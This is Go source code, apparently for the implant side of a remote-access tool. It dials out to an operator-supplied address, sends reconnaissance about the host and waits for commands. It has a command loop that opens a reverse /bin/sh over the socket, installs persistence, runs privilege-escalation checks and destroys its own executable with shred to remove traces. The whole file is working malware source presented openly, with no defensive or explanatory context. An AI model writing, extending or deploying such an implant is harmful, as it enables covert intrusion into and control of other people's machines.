package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

func main() {
	connectAddr := flag.String("connect", "", "address to connect to (ip:port)")
	flag.Parse()

	if *connectAddr == "" {
		fmt.Fprintf(os.Stderr, "usage: slave -connect <ip:port>\n")
		os.Exit(1)
	}

	conn, err := net.Dial("tcp", *connectAddr)
	if err != nil {
		fmt.Fprintf(os.Stderr, "connection failed: %v\n", err)
		os.Exit(1)
	}
	defer conn.Close()

	fmt.Fprintf(os.Stderr, "connected to %s\n", *connectAddr)

	encoder := json.NewEncoder(conn)
	decoder := json.NewDecoder(conn)

	// Send recon
	if err := encoder.Encode(gatherRecon(conn)); err != nil {
		fmt.Fprintf(os.Stderr, "failed to send recon: %v\n", err)
		return
	}

	// Command loop
	for {
		var msg struct {
			Cmd string `json:"cmd"`
		}
		if err := decoder.Decode(&msg); err != nil {
			fmt.Fprintf(os.Stderr, "connection lost: %v\n", err)
			return
		}

		switch strings.TrimSpace(msg.Cmd) {
		case "shell":
			fmt.Fprintf(os.Stderr, "spawning shell...\n")
			cmd := exec.Command("/bin/sh")
			cmd.Stdin = conn
			cmd.Stdout = conn
			cmd.Stderr = conn

			encoder.Encode(map[string]string{"status": "shell_ready"})

			if err := cmd.Run(); err != nil {
				fmt.Fprintf(os.Stderr, "shell exited: %v\n", err)
			}

			fmt.Fprintf(conn, "\n__ZHENG_SHELL_DONE__\n")

		case "exit":
			fmt.Fprintf(os.Stderr, "exiting...\n")
			return

		case "ping":
			encoder.Encode(map[string]string{"status": "pong"})

		case "persist":
			fmt.Fprintf(os.Stderr, "persisting...\n")
			result, err := persist()
			if err != nil {
				encoder.Encode(map[string]string{"status": "persist_fail", "error": err.Error()})
			} else {
				encoder.Encode(map[string]string{"status": "persisted", "detail": result})
			}

		case "lpe":
			fmt.Fprintf(os.Stderr, "running LPE checks...\n")
			encoder.Encode(map[string]string{"status": "lpe_running"})

			var checkNames []string
			for _, ch := range lpeChecks {
				checkNames = append(checkNames, ch.Name)
			}
			encoder.Encode(map[string]interface{}{"status": "lpe_checks", "checks": checkNames})

			var skipMsg struct {
				Cmd  string   `json:"cmd"`
				Skip []string `json:"skip"`
			}
			if err := decoder.Decode(&skipMsg); err != nil {
				fmt.Fprintf(os.Stderr, "failed to receive skip list: %v\n", err)
				return
			}

			skipSet := make(map[string]bool)
			for _, s := range skipMsg.Skip {
				skipSet[s] = true
			}

			results := make(map[string]string)
			for _, ch := range lpeChecks {
				if skipSet[ch.Name] {
					encoder.Encode(map[string]string{"status": "lpe_skip", "name": ch.Name})
					continue
				}
				encoder.Encode(map[string]string{"status": "lpe_check", "name": ch.Name, "cmd": ch.Command})
				results[ch.Name] = runShell(ch.Command)
			}

			encoder.Encode(results)

		case "destroy":
			fmt.Fprintf(os.Stderr, "self-destructing...\n")
			encoder.Encode(map[string]string{"status": "destroying"})

			exePath, err := os.Executable()
			if err != nil {
				fmt.Fprintf(os.Stderr, "failed to get executable path: %v\n", err)
				encoder.Encode(map[string]string{"status": "destroy_fail", "error": err.Error()})
				return
			}
			exePath, _ = filepath.EvalSymlinks(exePath)

			if _, err := exec.LookPath("shred"); err == nil {
				fmt.Fprintf(os.Stderr, "shredding %s\n", exePath)
				shred := exec.Command("shred", "-zuvn", "3", exePath)
				shred.Run()
			} else {
				fmt.Fprintf(os.Stderr, "shred not found, removing %s\n", exePath)
				os.Remove(exePath)
			}

			encoder.Encode(map[string]string{"status": "destroyed"})
			fmt.Fprintf(os.Stderr, "goodbye\n")
			return

		default:
			fmt.Fprintf(os.Stderr, "unknown command: %s\n", msg.Cmd)
		}
	}
}
